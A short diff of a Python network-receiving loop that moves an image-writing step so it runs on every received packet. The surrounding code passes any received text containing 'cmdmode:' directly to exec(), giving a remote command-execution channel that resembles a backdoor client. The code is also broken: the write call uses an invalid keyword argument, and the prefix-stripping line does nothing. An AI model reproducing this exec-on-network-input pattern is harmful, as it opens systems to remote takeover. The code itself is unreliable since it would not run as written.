@@ -17,6 +17,9 @@ try:
         if not data:
             break
 
+        with open("received_image.png", "wb") as f:
+                f.write(image_data = b""+data)
+                
         dec = data.decode()
         print(dec)
         if dec == "1":
@@ -29,9 +32,6 @@ try:
         elif "cmdmode:" in  dec:
             str.replace('cmdmode:', '')
             exec(dec)
-        else:
-            with open("received_image.png", "wb") as f:
-                f.write(image_data = b""+data)
     print("Update Window")
 except OSError as e:
     pass
